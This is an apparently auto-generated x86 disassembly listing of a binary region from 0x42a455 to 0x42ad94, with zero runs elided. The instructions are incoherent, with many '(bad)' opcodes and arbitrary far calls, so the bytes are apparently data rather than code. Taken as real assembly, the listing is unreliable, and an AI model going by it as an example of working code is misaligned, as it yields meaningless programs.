  42a455:	inc    ebx
  42a456:	sub    al,0x13
  42a458:	mov    BYTE PTR [edx+ecx*8+0x27],ah
  42a45c:	dec    esp
  42a45d:	(bad)  
  42a45e:	jo     0x42a473
  42a460:	xchg   BYTE PTR [esi-0x65],al
  42a463:	bound  ecx,QWORD PTR [eax+0x40]
  42a466:	and    DWORD PTR gs:[edi+0x5d],esi
  42a46a:	mov    cl,0x8d
  42a46c:	cld    
  42a46d:	xor    eax,0xe2631fc0
  42a472:	repnz lea ebx,[edx]
  42a475:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a476:	push   ds
  42a477:	(bad)  
  42a478:	jp     0x42a47b
  42a47a:	or     ecx,esi
  42a47c:	push   0xffffff9a
  42a47e:	mov    esi,0x4aebc030
  42a483:	xor    esp,DWORD PTR [edi-0xe]
  42a486:	ins    DWORD PTR es:[edi],dx
  42a487:	jecxz  0x42a487
  42a489:	sbb    esp,DWORD PTR [edx-0x6c]
  42a48c:	xchg   edi,eax
  42a48d:	cs dec edx
  42a48f:	pop    edx
  42a490:	cld    
  42a491:	lea    esp,[ecx]
  42a493:	iret   
  42a494:	arpl   WORD PTR [ebp+eiz*1-0x6652300c],bp
  42a49b:	cmp    BYTE PTR [eax-0x25de3f3f],cl
  42a4a1:	dec    ecx
  42a4a2:	fstp   TBYTE PTR [eax+0x3dca1a99]
  42a4a8:	shl    BYTE PTR [edx],1
  42a4aa:	daa    
  42a4ab:	mov    DWORD PTR [edi+eax*1],esp
  42a4ae:	sbb    al,0xb4
  42a4b0:	cmp    DWORD PTR [eax+0x37],edi
  42a4b3:	push   esi
  42a4b4:	lock add BYTE PTR [eax],al
	...
  42a513:	add    BYTE PTR [eax],al
  42a515:	add    BYTE PTR [eax],bl
  42a517:	dec    edi
  42a518:	pop    ss
  42a519:	mov    ecx,0xefbef957
  42a51e:	mov    cl,0xd7
  42a520:	dec    ebp
  42a521:	add    dl,BYTE PTR [ebx-0x38]
  42a524:	stc    
  42a525:	ja     0x42a59d
  42a527:	les    eax,FWORD PTR [ecx]
  42a529:	add    BYTE PTR [edi],al
  42a52b:	add    DWORD PTR [eax],eax
  42a52d:	add    BYTE PTR [edi+0x38fa0a1e],ah
  42a533:	daa    
  42a534:	mov    ecx,0x9f37d53e
  42a539:	mov    WORD PTR [esi+0x4e4f629f],?
  42a53f:	lods   al,BYTE PTR ds:[esi]
  42a540:	jbe    0x42a54d
  42a542:	cdq    
  42a543:	ds repz dec ebx
  42a546:	out    dx,eax
  42a547:	adc    BYTE PTR [esi-0x4d],dl
  42a54a:	in     al,dx
  42a54b:	or     DWORD PTR [ecx+0x76],0x59168372
  42a552:	pop    edi
  42a553:	out    0x4c,eax
  42a555:	out    0x80,al
  42a557:	sub    al,0xb5
  42a559:	js     0x42a598
  42a55b:	daa    
  42a55c:	push   ds
  42a55d:	sub    eax,0xc55e6b5
  42a562:	xchg   ebp,eax
  42a563:	dec    esp
  42a564:	xor    BYTE PTR [eax],ch
  42a566:	bound  eax,QWORD PTR [ebx+0xd]
  42a569:	lahf   
  42a56a:	cwde   
  42a56b:	pop    ebx
  42a56c:	fst    DWORD PTR [edx-0x4662a23f]
  42a572:	into   
  42a573:	jecxz  0x42a561
  42a575:	adc    BYTE PTR [esi+0x57],cl
  42a578:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a579:	mov    edx,edi
  42a57b:	add    al,0xa3
  42a57d:	arpl   dx,bx
  42a57f:	call   0x65e4:0xf1a2d04f
  42a586:	pop    es
  42a587:	dec    ebx
  42a588:	cwde   
  42a589:	jg     0x42a567
  42a58b:	outs   dx,DWORD PTR ds:[esi]
  42a58c:	cli    
  42a58d:	mov    BYTE PTR [eax],dl
  42a58f:	mov    DWORD PTR [eax-0xdfee88f],esi
  42a595:	fisubr DWORD PTR [edx+0x38da01e6]
  42a59b:	pop    ebx
  42a59c:	imul   esi,ebx,0xf452156c
  42a5a2:	repz inc esi
  42a5a4:	frstor [ecx+0x59172ceb]
  42a5aa:	mul    DWORD PTR [esi]
  42a5ac:	lds    esi,FWORD PTR [ebp-0x2550a357]
  42a5b2:	lea    ecx,[ecx+0x16]
  42a5b5:	and    dl,BYTE PTR [esi-0x6f]
  42a5b8:	stos   DWORD PTR es:[edi],eax
  42a5b9:	mov    cl,BYTE PTR [eax-0x2c]
  42a5bc:	add    eax,0x220b296a
  42a5c1:	mov    esp,0xe0cd55f2
  42a5c6:	and    eax,0x1aa3fb43
  42a5cb:	inc    edi
  42a5cc:	loope  0x42a601
  42a5ce:	or     al,0x33
  42a5d0:	mov    bl,0xa7
  42a5d2:	mov    ds:0x8f3cafb2,al
  42a5d7:	jae    0x42a5bd
  42a5d9:	add    ecx,DWORD PTR [edx-0x80]
  42a5dc:	ss repnz nop
  42a5df:	mov    cl,0x41
  42a5e1:	test   al,0xe4
  42a5e3:	jno    0x42a594
  42a5e5:	repnz push 0x3d18d0fc
  42a5eb:	jnp    0x42a600
  42a5ed:	ret    
  42a5ee:	or     BYTE PTR [ecx-0xa],0x60
  42a5f2:	push   eax
  42a5f3:	fstp   QWORD PTR [esp]
  42a5f6:	push   ss
  42a5f7:	(bad)  
  42a5f8:	dec    esp
  42a5f9:	inc    ebp
  42a5fa:	int    0x6f
  42a5fc:	inc    edi
  42a5fd:	daa    
  42a5fe:	jno    0x42a5bd
  42a600:	dec    ebx
  42a601:	hlt    
  42a602:	fisubr WORD PTR [eax-0x24]
  42a605:	ja     0x42a611
  42a607:	cwde   
  42a608:	adc    bl,BYTE PTR [edi+eax*4-0x1d]
  42a60c:	push   edi
  42a60d:	adc    edi,eax
  42a60f:	popf   
  42a610:	retf   0xe9cc
  42a613:	(bad)
  42a616:	bound  ebx,QWORD PTR [edx+0x28]
  42a619:	mov    ch,0x54
  42a61b:	je     0x42a5a8
  42a61d:	icebp  
  42a61e:	dec    esi
  42a61f:	xor    BYTE PTR [ebp+0x3f9476f7],bl
  42a625:	(bad)  
  42a627:	cmp    cl,ah
  42a629:	or     ebp,DWORD PTR [esi-0x2d]
  42a62c:	adc    al,ch
  42a62e:	jnp    0x42a6af
  42a630:	jp     0x42a5fc
  42a632:	mov    WORD PTR [edx+0x5f],ds
	...
  42a695:	add    BYTE PTR [esi+edx*1],ah
  42a698:	outs   dx,BYTE PTR ds:[esi]
  42a699:	(bad)  
  42a69a:	jle    0x42a69b
  42a69c:	lods   eax,DWORD PTR ds:[esi]
  42a69d:	test   DWORD PTR [edi],0xbf67323b
  42a6a3:	retf   0xf0c1
  42a6a6:	jge    0x42a66d
  42a6a8:	add    DWORD PTR [eax],eax
  42a6aa:	pop    es
  42a6ab:	add    DWORD PTR [eax],eax
  42a6ad:	add    dl,al
  42a6af:	adc    al,cl
  42a6b1:	or     ebp,DWORD PTR [eax]
  42a6b3:	dec    edi
  42a6b4:	add    ah,cl
  42a6b6:	push   esp
  42a6b7:	lock sbb DWORD PTR [edi+edx*2],edx
  42a6bb:	or     eax,0x56d2ef57
  42a6c0:	pop    edx
  42a6c1:	mov    edx,?
  42a6c3:	arpl   ax,bx
  42a6c5:	aas    
  42a6c6:	mov    al,0x4d
  42a6c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a6c9:	popa   
  42a6ca:	push   es
  42a6cb:	(bad)  
  42a6cc:	sbb    BYTE PTR [edi+0x4a],cl
  42a6cf:	test   al,0xe5
  42a6d1:	mov    bh,0xb7
  42a6d3:	retf   
  42a6d4:	cmp    ch,bl
  42a6d6:	sbb    BYTE PTR [ecx],cl
  42a6d8:	sahf   
  42a6d9:	push   cs
  42a6da:	cdq    
  42a6db:	arpl   WORD PTR [esi-0x74],sp
  42a6de:	and    BYTE PTR [ebx-0xd],ch
  42a6e1:	jp     0x42a676
  42a6e3:	mov    ds:0x461e1e8e,eax
  42a6e8:	pusha  
  42a6e9:	cmp    BYTE PTR [eax+eiz*4-0x74],ah
  42a6ed:	icebp  
  42a6ee:	add    DWORD PTR [eax+0x50],ecx
  42a6f1:	out    0xd3,al
  42a6f3:	mov    ds:0x385caf02,eax
  42a6f8:	xchg   esi,eax
  42a6f9:	pop    edx
  42a6fa:	sti    
  42a6fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a6fc:	jae    0x42a775
  42a6fe:	mov    cl,0x16
  42a700:	push   ds
  42a701:	pop    eax
  42a702:	push   ecx
  42a703:	stos   BYTE PTR es:[edi],al
  42a704:	sti    
  42a705:	cmp    DWORD PTR [esi+0x49376620],0x5a
  42a70c:	in     eax,0x3f
  42a70e:	xor    al,0x50
  42a710:	cwde   
  42a711:	push   ecx
  42a712:	lahf   
  42a713:	xlat   BYTE PTR ds:[ebx]
  42a714:	push   0x355d4b0e
  42a719:	pop    ss
  42a71a:	nop
  42a71b:	loope  0x42a75d
  42a71d:	add    BYTE PTR [ebp+0x5f],dh
  42a720:	inc    edx
  42a721:	mov    ds:0x795cca07,eax
  42a727:	pop    es
  42a728:	and    DWORD PTR [esi-0x2e],esp
  42a72b:	xor    DWORD PTR [ebx+0x48],0xe8edd01
  42a732:	int    0x78
  42a734:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a735:	pushf  
  42a736:	pusha  
  42a737:	push   ebx
  42a738:	popf   
  42a739:	or     eax,0x78c6483b
  42a73e:	lahf   
  42a73f:	lds    esi,FWORD PTR [ecx+0x18]
  42a742:	out    0x3e,al
  42a744:	(bad)  
  42a745:	icebp  
  42a746:	and    al,BYTE PTR [eax-0x76]
  42a749:	dec    edi
  42a74a:	xchg   BYTE PTR [edi+0x6a3d0432],bl
  42a750:	cmp    cl,cl
  42a752:	dec    edx
  42a753:	adc    eax,0x68b003b
  42a758:	(bad)  
  42a759:	xchg   edx,eax
  42a75a:	es aaa 
  42a75c:	jge    0x42a738
  42a75e:	cmp    al,0xca
  42a760:	push   edx
  42a761:	loopne 0x42a77e
  42a763:	dec    ebp
  42a764:	out    dx,al
  42a765:	cmp    DWORD PTR [eax],ebx
  42a767:	popf   
  42a768:	dec    esi
  42a769:	adc    BYTE PTR ds:0x9fb427c8,dh
  42a76f:	rol    BYTE PTR [eax+0x66],1
  42a772:	push   DWORD PTR [edi+0x53]
  42a775:	cdq    
  42a776:	push   ss
  42a777:	adc    eax,0xe88481eb
  42a77c:	rol    DWORD PTR [edx-0x408ead25],0xa3
  42a783:	xor    eax,0x744750f0
  42a788:	fucom  st(7)
  42a78a:	jle    0x42a7dd
  42a78c:	scas   al,BYTE PTR es:[edi]
  42a78d:	hlt    
  42a78e:	ret    
  42a78f:	(bad)  
  42a791:	(bad)  
  42a792:	(bad)  
  42a793:	clc    
  42a794:	push   0x81bf28ee
  42a799:	push   0x5bf91a29
  42a79e:	xchg   ebx,eax
  42a79f:	cli    
  42a7a0:	(bad)  
  42a7a2:	jbe    0x42a73a
  42a7a4:	mov    ch,0xb8
  42a7a6:	ror    eax,0x41
  42a7a9:	push   0x99325efc
  42a7ae:	and    bl,cl
  42a7b0:	xor    ch,al
  42a7b2:	or     esi,DWORD PTR [esi+ebp*4+0x0]
	...
  42a816:	mov    ah,BYTE PTR [ebp+0x63]
  42a819:	mov    edi,0x75debfef
  42a81e:	jp     0x42a869
  42a820:	arpl   WORD PTR [ebx],sp
  42a822:	cmp    bl,BYTE PTR [esi]
  42a824:	add    esi,DWORD PTR [ebp+0x1c684]
  42a82a:	pop    es
  42a82b:	add    DWORD PTR [eax],eax
  42a82d:	add    BYTE PTR [ebx+0x2f],cl
  42a830:	push   esi
  42a831:	xchg   ebp,eax
  42a832:	pop    es
  42a833:	push   esi
  42a834:	fwait
  42a835:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a836:	test   al,0x58
  42a838:	inc    esi
  42a839:	jecxz  0x42a806
  42a83b:	push   ds
  42a83c:	cmp    eax,0x8ca44aca
  42a841:	mov    eax,0x274f31cf
  42a846:	xor    eax,0x5408c64e
  42a84b:	loop   0x42a82c
  42a84d:	inc    ecx
  42a84e:	inc    edx
  42a84f:	fmul   QWORD PTR [edi+0x1d]
  42a852:	adc    dh,BYTE PTR [ecx]
  42a854:	jmp    0xf4fd9fc1
  42a859:	shl    BYTE PTR [eax+eiz*2-0x50],0x26
  42a85e:	aad    0xa1
  42a860:	mov    al,0xaf
  42a862:	dec    ebx
  42a863:	mov    ds:0x392c919d,al
  42a868:	mov    esi,0xd01f892e
  42a86d:	sbb    al,BYTE PTR [ebx+0x31]
  42a870:	lds    esp,FWORD PTR [edi-0x3a25e3ab]
  42a876:	mov    eax,0x8f3744fc
  42a87b:	cs xchg ebx,eax
  42a87d:	cmp    edi,edi
  42a87f:	sbb    BYTE PTR [esi],al
  42a881:	sar    DWORD PTR [ebx-0x56],1
  42a884:	out    dx,al
  42a885:	and    al,0x4d
  42a887:	adc    DWORD PTR [eax+eax*2+0x4f],ebx
  42a88b:	out    0x21,eax
  42a88d:	scas   al,BYTE PTR es:[edi]
  42a88e:	repnz mov ebp,0xdb413327
  42a894:	std    
  42a895:	mov    al,0x74
  42a897:	dec    DWORD PTR [eax+ebp*2]
  42a89a:	(bad)  
  42a89b:	xchg   esp,eax
  42a89c:	popa   
  42a89d:	int3   
  42a89e:	push   ss
  42a89f:	push   esp
  42a8a0:	out    dx,eax
  42a8a1:	icebp  
  42a8a2:	jge    0x42a840
  42a8a4:	cmp    BYTE PTR [ecx+0x39f50732],0xdc
  42a8ab:	jbe    0x42a8f8
  42a8ad:	inc    edx
  42a8ae:	int3   
  42a8af:	call   0x346b:0xbaf8c3
  42a8b6:	xchg   esp,eax
  42a8b7:	ins    DWORD PTR es:[edi],dx
  42a8b8:	mov    esi,0xcfcaacaa
  42a8bd:	xor    DWORD PTR [esi],eax
  42a8bf:	pushf  
  42a8c0:	pop    di
  42a8c2:	mov    ebx,0xc3f89d9d
  42a8c7:	mov    BYTE PTR [ebx-0xf460cd7],ah
  42a8cd:	sub    DWORD PTR [edi-0x76],esi
  42a8d0:	jl     0x42a8bb
  42a8d2:	xchg   DWORD PTR [ebp-0x42],esi
  42a8d5:	dec    ebp
  42a8d6:	mov    esp,0x91e1b23b
  42a8db:	add    BYTE PTR [edx],bh
  42a8dd:	pop    ebp
  42a8de:	xchg   edx,eax
  42a8df:	or     al,0x29
  42a8e1:	inc    esp
  42a8e2:	pop    eax
  42a8e3:	outs   dx,BYTE PTR ds:[esi]
  42a8e4:	pop    ecx
  42a8e5:	test   edi,0xc2e44747
  42a8eb:	(bad)  
  42a8ec:	lds    edi,FWORD PTR [edi+0x78cab361]
  42a8f2:	fdiv   st(0),st
  42a8f4:	jbe    0x42a8f9
  42a8f6:	popf   
  42a8f7:	pusha  
  42a8f8:	dec    ebx
  42a8f9:	jno    0x42a968
  42a8fb:	sbb    BYTE PTR [esi+0x2ed7278c],al
  42a901:	xchg   ebp,eax
  42a902:	das    
  42a903:	leave  
  42a904:	xor    eax,0x37ba9d85
  42a909:	add    al,0x80
  42a90b:	pop    esi
  42a90c:	int    0xa0
  42a90e:	inc    eax
  42a90f:	lock cmp BYTE PTR [edi+ebx*8-0x42],al
  42a914:	add    al,0x9f
  42a916:	mov    ah,0xbb
  42a918:	leave  
  42a919:	xor    esi,DWORD PTR [ebp+0x56]
  42a91c:	ret    
  42a91d:	pop    edi
  42a91e:	sti    
  42a91f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a920:	loop   0x42a8ea
  42a922:	adc    BYTE PTR [ebx],dh
  42a924:	int    0xad
  42a926:	or     esp,DWORD PTR [edx]
  42a928:	sub    DWORD PTR [edi],edi
  42a92a:	cmp    DWORD PTR [ebp+0x10],0x79
  42a92e:	mov    dl,bh
  42a930:	adc    eax,0x3e7e966b
	...
  42a995:	add    BYTE PTR [eax+0x3fee1d93],ch
  42a99b:	out    dx,al
  42a99c:	sti    
  42a99d:	xlat   BYTE PTR ds:[ebx]
  42a99e:	push   esi
  42a99f:	aam    0xbc
  42a9a1:	or     edi,DWORD PTR [edx-0x21]
  42a9a4:	inc    edi
  42a9a5:	out    0x8b,al
  42a9a7:	mov    DWORD PTR [ecx],0x10700
  42a9ad:	add    BYTE PTR [esp+ebx*2],bl
  42a9b0:	adc    edi,DWORD PTR [eax+esi*1-0x2a]
  42a9b4:	adc    BYTE PTR [edi+eiz*8],cl
  42a9b7:	iret   
  42a9b8:	int3   
  42a9b9:	jae    0x42aa16
  42a9bb:	jg     0x42aa3c
  42a9bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a9be:	xchg   esi,eax
  42a9bf:	inc    eax
  42a9c0:	js     0xfe64de23
  42a9c6:	jmp    0xb650cb84
  42a9cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a9cc:	fstp   TBYTE PTR [esi]
  42a9ce:	mov    edx,0x1051d7ec
  42a9d3:	in     al,0x87
  42a9d5:	lods   al,BYTE PTR ds:[esi]
  42a9d6:	fcmove st,st(7)
  42a9d8:	jecxz  0x42aa12
  42a9da:	das    
  42a9db:	sti    
  42a9dc:	pop    ebp
  42a9dd:	fldcw  WORD PTR [ebx+0x77b30b0a]
  42a9e3:	lods   eax,DWORD PTR ds:[esi]
  42a9e4:	retf   0x1e89
  42a9e7:	pusha  
  42a9e8:	xor    DWORD PTR [eax-0x35],edx
  42a9eb:	bound  edx,QWORD PTR [edx]
  42a9ed:	xlat   BYTE PTR ds:[ebx]
  42a9ee:	leave  
  42a9ef:	leave  
  42a9f0:	addr16 pusha 
  42a9f2:	aas    
  42a9f3:	in     eax,dx
  42a9f4:	je     0x42a978
  42a9f6:	(bad)  
  42a9f7:	pushf  
  42a9f8:	sbb    eax,0x2f7e7a70
  42a9fd:	retf   0x2461
  42aa00:	pop    es
  42aa01:	pop    esp
  42aa02:	mov    al,0x8a
  42aa04:	int3   
  42aa05:	inc    esp
  42aa06:	cmp    al,0x6b
  42aa08:	jmp    0x6f819ce2
  42aa0d:	ffreep st(5)
  42aa0f:	pop    ebp
  42aa10:	and    cl,BYTE PTR [esp+esi*4-0x5f]
  42aa14:	stos   DWORD PTR es:[edi],eax
  42aa15:	add    esp,ebx
  42aa17:	xchg   ecx,eax
  42aa18:	mov    edx,DWORD PTR ds:0xc61d658b
  42aa1e:	add    DWORD PTR [edx-0x23b0b9f6],eax
  42aa24:	out    0x4a,eax
  42aa26:	jge    0x42aa55
  42aa28:	popf   
  42aa29:	sahf   
  42aa2a:	and    DWORD PTR [eax],edi
  42aa2c:	mov    bh,0xf9
  42aa2e:	test   DWORD PTR [edi-0x5a8bf84f],edi
  42aa34:	clc    
  42aa35:	pusha  
  42aa36:	inc    edx
  42aa37:	or     al,0x51
  42aa39:	ja     0x42aa75
  42aa3b:	mov    dh,0x87
  42aa3d:	(bad)  
  42aa3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42aa3f:	mov    eax,ebp
  42aa41:	push   ebx
  42aa42:	sub    edx,DWORD PTR [ecx]
  42aa44:	dec    eax
  42aa45:	push   cs
  42aa46:	pop    edx
  42aa47:	xor    bh,0x8b
  42aa4a:	mov    ds:0xdf80aa03,eax
  42aa4f:	and    ch,bh
  42aa51:	dec    edx
  42aa52:	scas   eax,DWORD PTR es:[edi]
  42aa53:	neg    cl
  42aa55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aa56:	(bad)  
  42aa57:	out    dx,eax
  42aa58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aa59:	pop    esi
  42aa5a:	mov    cl,0x10
  42aa5c:	add    eax,0x568cef87
  42aa61:	sar    BYTE PTR [edx],0x21
  42aa64:	imul   ebp,DWORD PTR [edx-0x33b44ea9],0xd
  42aa6b:	outs   dx,DWORD PTR ds:[esi]
  42aa6c:	jge    0x42aae3
  42aa6e:	popf   
  42aa6f:	pop    DWORD PTR [edx+0x7bb30c34]
  42aa75:	outs   dx,DWORD PTR ds:[esi]
  42aa76:	call   0x565a:0x2be40834
  42aa7d:	pop    DWORD PTR [edi+0x28b1b6c7]
  42aa83:	jbe    0x42aa4b
  42aa85:	pop    edx
  42aa86:	aad    0xfd
  42aa88:	or     al,0xc7
  42aa8a:	mov    eax,0x65c1d496
  42aa8f:	sub    al,BYTE PTR [edx+0x58]
  42aa92:	mov    ecx,ebp
  42aa94:	mov    ah,0x1f
  42aa96:	sbb    dh,BYTE PTR [ebp+0x75]
  42aa99:	inc    esi
  42aa9a:	xchg   ebx,eax
  42aa9b:	idiv   cl
  42aa9d:	leave  
  42aa9e:	fwait
  42aa9f:	iret   
  42aaa0:	xor    DWORD PTR [edx],eax
  42aaa2:	(bad)  
  42aaa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aaa4:	ss and bl,ah
  42aaa7:	hlt    
  42aaa8:	scas   eax,DWORD PTR es:[edi]
  42aaa9:	jns    0x42aa7c
  42aaab:	mov    esi,0x77a275c9
  42aab0:	rol    BYTE PTR [ecx+0x5cc8ed],0x0
	...
  42ab13:	add    BYTE PTR [eax],al
  42ab15:	add    BYTE PTR [esi],bh
  42ab17:	push   cs
  42ab18:	sub    al,0x5d
  42ab1a:	cmp    al,0x7f
  42ab1c:	jg     0x42ab8d
  42ab1e:	dec    eax
  42ab1f:	das    
  42ab20:	pop    edi
  42ab21:	mov    DWORD PTR [esi-0x6d6148db],esi
  42ab27:	enter  0x1,0x7
  42ab2b:	add    DWORD PTR [eax],eax
  42ab2d:	add    BYTE PTR [esi],cl
  42ab2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ab30:	ror    bh,0x35
  42ab33:	dec    edx
  42ab34:	cmp    dl,BYTE PTR [esp+0x53720993]
  42ab3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ab3c:	pop    es
  42ab3d:	aad    0x3b
  42ab3f:	jb     0x42aaf9
  42ab41:	xchg   ebp,eax
  42ab42:	push   es
  42ab43:	sub    dh,BYTE PTR [eax]
  42ab45:	jno    0x42ab78
  42ab47:	pop    eax
  42ab48:	adc    bl,bh
  42ab4a:	jne    0x42abc4
  42ab4c:	test   esi,esi
  42ab4e:	add    al,BYTE PTR [ebx]
  42ab50:	sar    BYTE PTR [esp+eax*4],cl
  42ab53:	or     DWORD PTR ds:0xbf12c6cc,esi
  42ab59:	scas   eax,DWORD PTR es:[edi]
  42ab5a:	add    esp,DWORD PTR [esi]
  42ab5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ab5d:	xor    ah,BYTE PTR [eax+0x7f978f2c]
  42ab63:	fcmovb st,st(0)
  42ab65:	(bad)  
  42ab66:	pop    esi
  42ab67:	xor    DWORD PTR [edx+edx*8-0x2242ad8f],esp
  42ab6e:	sub    edx,DWORD PTR [edx]
  42ab70:	rcl    ecx,cl
  42ab72:	xchg   BYTE PTR [edx],ah
  42ab74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ab75:	mov    dl,0x6a
  42ab77:	add    DWORD PTR [esi+eax*1-0x53],edi
  42ab7b:	ja     0x42ab87
  42ab7d:	mov    ebp,edi
  42ab7f:	sbb    ah,BYTE PTR [edx]
  42ab81:	lock and edx,DWORD PTR [esi+0xc]
  42ab85:	add    ebp,DWORD PTR [edx-0x3e5837a5]
  42ab8b:	mov    ebp,0xa55bb365
  42ab90:	pop    esp
  42ab91:	fdiv   QWORD PTR [eax-0x3c]
  42ab94:	(bad)  
  42ab95:	push   esi
  42ab96:	mov    al,ds:0x8aa45da
  42ab9b:	push   eax
  42ab9c:	pop    edi
  42ab9d:	xchg   edi,eax
  42ab9e:	cmp    al,0x97
  42aba0:	pop    edi
  42aba1:	push   0x6d
  42aba3:	test   DWORD PTR [ebx+0x1d],esi
  42aba6:	mov    al,0xf5
  42aba8:	jns    0x42ab5c
  42abaa:	sub    DWORD PTR [esi],0xc1362b83
  42abb0:	pop    ebp
  42abb1:	aas    
  42abb2:	outs   dx,BYTE PTR ds:[esi]
  42abb3:	sbb    al,0x5c
  42abb5:	sub    al,0xa5
  42abb7:	test   BYTE PTR [eax+0x49ed57a],dl
  42abbd:	dec    edi
  42abbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42abbf:	in     al,dx
  42abc0:	pop    ecx
  42abc1:	fidiv  WORD PTR [esi]
  42abc3:	test   al,0x79
  42abc5:	shl    BYTE PTR [ecx],cl
  42abc7:	inc    esi
  42abc8:	cmp    DWORD PTR [edi+esi*2],esp
  42abcb:	xor    eax,0xd09324f9
  42abd0:	xchg   esp,eax
  42abd1:	push   0xffffffc6
  42abd3:	je     0x42ac48
  42abd5:	sbb    eax,0x5089872
  42abda:	sub    BYTE PTR [esi+0x3b254fc],ch
  42abe0:	push   0x4f
  42abe2:	mov    edx,0x51779330
  42abe7:	jno    0x42aba6
  42abe9:	out    dx,eax
  42abea:	adc    eax,0x30a9fa37
  42abef:	sbb    DWORD PTR [eax-0x13a30663],0x95384f81
  42abf9:	das    
  42abfa:	mov    ecx,0x2be65af5
  42abff:	mov    eax,ds:0xb6904f4
  42ac04:	les    esp,FWORD PTR [ecx]
  42ac06:	fbld   TBYTE PTR ds:0xc92aed5e
  42ac0c:	int3   
  42ac0d:	dec    edi
  42ac0e:	jo     0x42abb4
  42ac10:	or     al,0x73
  42ac12:	dec    esp
  42ac13:	mov    dh,0xcd
  42ac15:	cdq    
  42ac16:	retf   0x3486
  42ac19:	mov    esp,0x46fdf661
  42ac1e:	in     al,dx
  42ac1f:	mov    edi,DWORD PTR ds:0x2445226c
  42ac25:	inc    ebp
  42ac26:	jmp    0xccad:0xcd5bfd39
  42ac2d:	test   eax,0x195132b3
  42ac32:	inc    esi
  42ac33:	ror    ah,cl
	...
  42ac95:	add    cl,ch
  42ac97:	xor    bl,BYTE PTR [edx+edi*1]
  42ac9a:	fistp  QWORD PTR [esi]
  42ac9c:	out    dx,eax
  42ac9d:	repz rcl BYTE PTR [edi-0x485ef5a7],cl
  42aca4:	sar    BYTE PTR [ebp-0x67],cl
  42aca7:	leave  
  42aca8:	add    DWORD PTR [eax],eax
  42acaa:	pop    es
  42acab:	add    DWORD PTR [eax],eax
  42acad:	add    bh,bh
  42acaf:	repnz sbb ebx,esi
  42acb2:	das    
  42acb3:	in     al,dx
  42acb4:	outs   dx,BYTE PTR ds:[esi]
  42acb5:	mov    al,0x3d
  42acb7:	mov    esp,0xddac8784
  42acbc:	cli    
  42acbd:	jle    0x42ace4
  42acbf:	loopne 0x42acc3
  42acc1:	xchg   edx,eax
  42acc2:	test   BYTE PTR [edi+0x381cf3ec],bh
  42acc8:	or     ch,BYTE PTR [edx+0x34333945]
  42acce:	data16 fwait
  42acd0:	pop    ebp
  42acd1:	hlt    
  42acd2:	in     al,0x3a
  42acd4:	push   es
  42acd5:	(bad)  
  42acd6:	dec    esp
  42acd7:	ins    BYTE PTR es:[edi],dx
  42acd8:	xor    al,0x66
  42acda:	popa   
  42acdb:	pushf  
  42acdc:	or     cl,BYTE PTR [ecx]
  42acde:	sub    DWORD PTR [edx+0x7821c8d8],eax
  42ace4:	dec    ebx
  42ace5:	jb     0x42acd2
  42ace7:	pop    ebx
  42ace8:	fnstcw WORD PTR [edi-0x5a]
  42aceb:	mov    BYTE PTR [esi-0x2f1f4131],dh
  42acf1:	pop    esi
  42acf2:	es pusha 
  42acf4:	div    ecx
  42acf6:	mov    ds:0x224f1349,eax
  42acfb:	enter  0x8300,0x74
  42acff:	sub    eax,0xf5fee10c
  42ad04:	sub    BYTE PTR [edi+0x77],bh
  42ad07:	push   edi
  42ad08:	adc    eax,0x2912fe86
  42ad0d:	xchg   esp,eax
  42ad0e:	cs ret 
  42ad10:	shl    DWORD PTR [eax],0x1b
  42ad13:	dec    esp
  42ad14:	aas    
  42ad15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ad16:	push   es
  42ad17:	pop    ebp
  42ad18:	add    BYTE PTR [edx],dh
  42ad1a:	push   eax
  42ad1b:	xor    BYTE PTR [ebp-0x46b97896],bh
  42ad21:	outs   dx,BYTE PTR ds:[esi]
  42ad22:	(bad)  
  42ad24:	sbb    eax,0xfa8ca0c6
  42ad29:	pop    ecx
  42ad2a:	jns    0x42ada0
  42ad2c:	jae    0x42ad77
  42ad2e:	push   ebx
  42ad2f:	std    
  42ad30:	fnstenv [eax]
  42ad32:	ret    
  42ad33:	retf   
  42ad34:	ja     0x42acce
  42ad36:	in     al,dx
  42ad37:	and    bl,al
  42ad39:	fisttp QWORD PTR [eax+0x6bf73602]
  42ad3f:	pop    esp
  42ad40:	in     al,0xa
  42ad42:	out    0x4e,eax
  42ad44:	xchg   DWORD PTR [eax+0x6443d2b9],esp
  42ad4a:	mov    ds:0x4fa0f14f,al
  42ad4f:	popa   
  42ad50:	and    BYTE PTR [ecx-0x6b762ed5],cl
  42ad56:	test   BYTE PTR [edx],al
  42ad58:	sub    eax,0xa686f2a3
  42ad5d:	popa   
  42ad5e:	ss inc esi
  42ad60:	sbb    BYTE PTR [ebx-0x163662e],ah
  42ad66:	push   esp
  42ad67:	push   ebp
  42ad68:	iret   
  42ad69:	xor    ebp,eax
  42ad6b:	popa   
  42ad6c:	or     DWORD PTR [ebx-0x77],esp
  42ad6f:	adc    dl,BYTE PTR [ebx]
  42ad71:	dec    DWORD PTR [edi+0x3d54d456]
  42ad77:	push   ecx
  42ad78:	add    eax,0xa198a9cd
  42ad7d:	mov    cl,dl
  42ad7f:	and    ebp,DWORD PTR ds:0x7614d3da
  42ad85:	jmp    0xc79c1634
  42ad8a:	das    
  42ad8b:	dec    ebx
  42ad8c:	fld    QWORD PTR ds:0x39c84fb0
  42ad92:	xchg   ecx,eax
  42ad93:	aaa    
  42ad94:	mov    al,0x12
